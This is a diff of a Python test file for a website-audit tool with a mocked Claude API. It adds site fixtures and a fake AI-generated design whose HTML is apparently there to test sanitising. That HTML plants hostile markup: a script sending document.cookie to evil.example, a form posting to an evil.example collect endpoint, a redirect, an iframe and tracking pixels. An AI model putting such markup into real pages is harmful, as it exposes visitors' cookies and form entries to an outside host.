@@ -15,11 +15,17 @@ GOOD_HTML = """<!doctype html>
 <meta name="description" content="Friendly family dentist in Houston offering check-ups, whitening and emergency care.">
 <meta property="og:title" content="Bright Smile Dental">
 <link rel="icon" href="/icon.png">
+<link rel="stylesheet" href="https://fonts.example/font.css">
+<link rel="stylesheet" href="/site.css">
+<meta property="og:image" content="/img/team.jpg">
+<style>body{color:#222;background:#fff} .cta{background:#e4572e}</style>
 <script type="application/ld+json">{"@type": "Dentist"}</script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-TEST"></script>
 <script src="https://widget.intercom.io/widget/abc"></script>
 </head><body>
+<nav><a href="/">Home</a> <a href="/services">Treatments</a> <a href="/team">Our team</a> <a href="/fees">Fees</a> <a href="/contact">Contact</a></nav>
 <h1>Family dentist in Houston</h1>
+<h2>General dentistry</h2> <h2>Teeth whitening</h2> <h3>Emergency appointments</h3> <h2>Welcome</h2>
 <p>We look after families across Houston with gentle, modern dental care. Our team has
 more than twenty years of experience and we welcome new patients every week of the year.
 Call us today or book online to arrange your first visit with our friendly dentists.</p>
@@ -51,6 +57,16 @@ Please telephone the office during working hours and we will get back to you qui
 <p>Copyright 2015 Joe's Plumbing</p>
 </body></html>"""
 
+# A tiny but valid JPEG (1x1 pixel), standing in for a site's share image
+JPEG_BYTES = bytes.fromhex(
+    "ffd8ffe000104a46494600010100000100010000ffdb004300080606070605080707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720"
+    "222c231c1c2837292c30313434341f27393d38323c2e333432ffc0000b080001000101011100ffc4001f0000010501010101010100000000000000000102030405"
+    "060708090a0bffc400b5100002010303020403050504040000017d01020300041105122131410613516107227114328191a1082342b1c11552d1f02433627282"
+    "090a161718191a25262728292a3435363738393a434445464748494a535455565758595a636465666768696a737475767778797a838485868788898a92939495"
+    "969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffda0008"
+    "010100003f00fbfcffd9"
+)
+
 SPA_HTML = """<!doctype html><html><head><title>Loading application shell</title>
 <meta name="viewport" content="width=device-width"><script src="/bundle.js"></script></head>
 <body><div id="root"></div></body></html>"""
@@ -77,8 +93,13 @@ def site_handler(request: httpx.Request) -> httpx.Response:
             return httpx.Response(200, text=GOOD_HTML, headers=html)
         if path == "/contact":
             return httpx.Response(200, text=CONTACT_HTML, headers=html)
-        if path == "/services":
+        if path in ("/services", "/team", "/fees"):
             return httpx.Response(200, text="<html><body>Services</body></html>", headers=html)
+        if path == "/site.css":
+            return httpx.Response(200, text="a{color:#1b6ca8}.btn{background:#1b6ca8;border-color:#1B6CA8}.x{color:#f4f4f4}.y{color:rgb(228, 87, 46)}", headers={"content-type": "text/css"})
+        if path == "/img/team.jpg":
+            # padded to the size of a real photo; small files are treated as logos and skipped
+            return httpx.Response(200, content=JPEG_BYTES + b"\0" * 20000, headers={"content-type": "image/jpeg"})
         return httpx.Response(404, text="not found", headers=html)
 
     if host == "old.example":
@@ -138,10 +159,50 @@ Test Person
 Studio"""
 
 
+CLAUDE_DESIGN = """Here is the design.
+
+```html
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Concept</title>
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<style>
+@import url("https://evil.example/font.css");
+html,body{margin:0;width:1440px;height:1800px;overflow:hidden;font-family:"Segoe UI",system-ui,sans-serif}
+.hero{height:700px;background:#7a1f3d url(https://evil.example/track.png);color:#fff}
+.photo{background-image:url(HERO_IMAGE_SRC)}
+.ok{background:url(data:image/png;base64,AAAA)}
+h1{font:700 72px/1.05 Georgia,serif;margin:0;padding:120px 80px 0}
+</style></head>
+<body onload="steal()">
+<header><strong>__NAME__</strong> <a href="https://evil.example/login" onclick="steal()">Rooms</a> <a href="#offers">Offers</a></header>
+<section class="hero"><h1>A homepage designed for this business alone</h1><img src="HERO_IMAGE_SRC" alt=""><img src="https://evil.example/pixel.gif"></section>
+<section><h2>What we offer</h2><p>A short summary of this service. A short summary of this service. A short summary of this service.</p>
+<svg viewBox="0 0 10 10"><use href="https://evil.example/sprite.svg#x"></use><circle cx="5" cy="5" r="4"></circle></svg></section>
+<form action="https://evil.example/collect"><input name="name"><button formaction="https://evil.example/2">Send enquiry</button></form>
+<iframe src="https://evil.example/frame"></iframe>
+<script>fetch("https://evil.example/?c=" + document.cookie)</script>
+<footer>__NAME__ · 14 Quay St</footer>
+</body></html>
+```
+"""
+
+
 def claude_handler(request: httpx.Request) -> httpx.Response:
     import json
-    CLAUDE_STATE["calls"].append({"body": json.loads(request.content), "headers": dict(request.headers)})
+    body = json.loads(request.content)
+    CLAUDE_STATE["calls"].append({"body": body, "headers": dict(request.headers)})
     mode = CLAUDE_STATE["mode"]
+    system = body.get("system", "")
+    if "senior web designer" in system and mode in ("ok", "design_offtopic", "design_truncated"):
+        data = json.loads(body["messages"][0]["content"].split("<data>")[1].split("</data>")[0])
+        name = data["business"]["name"] if mode == "ok" else "Some Other Company"
+        reply = {"content": [{"type": "thinking", "thinking": "plan"}, {"type": "text", "text": CLAUDE_DESIGN.replace("__NAME__", name)}],
+                 "stop_reason": "max_tokens" if mode == "design_truncated" else "end_turn"}
+        return httpx.Response(200, json=reply)
+    if "opening of a short website review" in system and mode in ("ok", "design_offtopic", "design_truncated"):
+        text = 'Here you go: {"intro": "We spent some time with your website this week. It already does the basics well, and the clearest gains are in how quickly it loads.", "insight": "For a business like yours, the website is where most first impressions are formed."}'
+        return httpx.Response(200, json={"content": [{"type": "text", "text": text}], "stop_reason": "end_turn"})
     if mode == "bad_key":
         return httpx.Response(401, json={"type": "error", "error": {"type": "authentication_error", "message": "invalid x-api-key"}})
     if mode == "no_credit":
